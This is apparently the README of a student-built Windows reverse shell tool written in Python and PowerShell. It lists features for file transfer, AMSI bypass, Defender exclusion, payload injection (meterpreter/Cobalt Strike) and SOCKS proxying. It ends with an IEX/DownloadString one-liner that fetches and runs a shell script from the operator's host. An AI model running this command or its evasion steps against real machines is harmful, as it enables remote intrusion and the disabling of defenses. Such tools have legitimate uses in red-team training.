# Introduction

A small windows reverse shell project that i build during my university intership.\
It is written with Python and Powershell.\
33333333333333333333333333333333333333333 but also 7 (\~^-^)\~

# Installation

To simply install it:

1.  Clone this repo with the following code
    ```
    git clone https://github.com/Fedami/powerrevshell---rev.ps1
    ```
3.  Run the following code to install all the requirements
    ```
    pip install -r requirements.txt
    ```
3.  Run the following code to make the .py file executable or simply run it with python
    ```
    chmod +x powerrevshell.py or python3 powerrevshell.py
    ```
## Powerrevshell

![powerrevshell-start-short](https://user-images.githubusercontent.com/82824055/173030103-c57222f4-fc15-4766-bd19-64d1963d9df3.png)

# Optional argument
  -h, --help        &emsp;&emsp;&ensp;    show this help message and exit\
  -f folder &emsp;&emsp;&emsp; smb folder for transfer funciontality\
  &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;                      Enter folder name [Default: root]\
  -i local ip       &emsp;&emsp;&ensp;&nbsp;    Enter your local IP [Default: 192.168.0.114]\
  -p port           &emsp;&emsp;&emsp;&ensp;&nbsp;    listener port for reverse shell [Default: 9001]\
  -wp webport       &emsp;&nbsp;    listener port for http server [Default: 8000]\
  -sp smbport       &emsp;&ensp;     listener port for smb server [Default: 445]\
  -http             &emsp;&emsp;&emsp;&emsp;&ensp;&nbsp;    Start http web server [Default: 8000]\
  -smb              &emsp;&emsp;&emsp;&emsp;&ensp;&nbsp;    Start smb web server [Default: 445]\
  -k                &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;    If ports are being used it will kill the process to force the exexcution.

# Functionality

Powerrevshell.py comes with several function accessible via the "menu" option:

![powerrevshell-menu](https://user-images.githubusercontent.com/82824055/171123395-27647e7f-9853-43e8-adae-8ea33e231bf3.png)

### get - put

The get and put functionality are build using TCPSocket to transfer files between the machines. To prevent data loss, on each message, are sent support string and md5sum to know if the actual bytes are sent correctly.

```
get <file.txt> / put <file.txt>
```

### smb-get

The smb-get functionality simply transfer a file using the Copy-Item cmdlet to the smbserver started using impacket-smbserver.\
If you didn't start the program with the -smb switch or started youreself (impacket-smbserver) the command will fail.

```
smb-get <file.txt>
```

### down-file

The down-file functionality simply download a file from the current machine to the target machine using HTTP server with python.
If you didn't start the program with the -http switch or started youreself (python -m http.server 8000) the command will fail.

```
down-file <file.txt>
```

### load

The down-file functionality simply load a powershell script from the current machine to the target machine using HTTP server with python.
If you didn't start the program with the -http switch or started youreself (python -m http.server 8000) the command will fail.

```
load <file.ps1>
```

### amsi-bypass

The amsi-bypass functionality will try to bypass AMSI on the current shell by using the Matt Graeber amsi bypass method obfuscated with two bytes array.

```
amsi-bypass
```

### exclude

The exlucde functionality will try to exclude powershell.exe from defender, admin permission are needed.

```
exclude
```

### payload

The payload functionality will try to create a new process and inject the shell payload that can be meterpreter or cobalt strike...\
The payload must be a cs file.

```
payload <payload.cs>
```

Work used for the socks functionality: [PowerProxy by get-get-get-get](https://github.com/get-get-get-get/PowerProxy).

### socks-start

Socks-start start a socks proxy.

```
socks-start <L-PORT> <P-PORT>
```
You can also omit L-PORT and P-Port, by default L-PORT is 8080 and P-PORT is 1080.

```
socks-start
```

### socks-stop

Socks-stop will stop any running socks on the target machine that was started before.

```
socks-stop
```

### socks

Socks will list if there is a running socks proxy.

```
socks
```

### close

Close will terminate the session by killing the powershell process, if the command exclude was used it will delete the exclusion policy. Also if it was started a socks proxy it will kill it before killing the session.

```
close
```

## Rev.ps1

Rev.ps1 is the powershell script to connect back to us.\
To start the reverse shell run the following code on the target machine.

```
IEX (New-Object System.Net.WebClient).DownloadString('http://<IP>:<PORT>/rev.ps1'); Send-Shell -i <IP> -p <ShellPort>
```
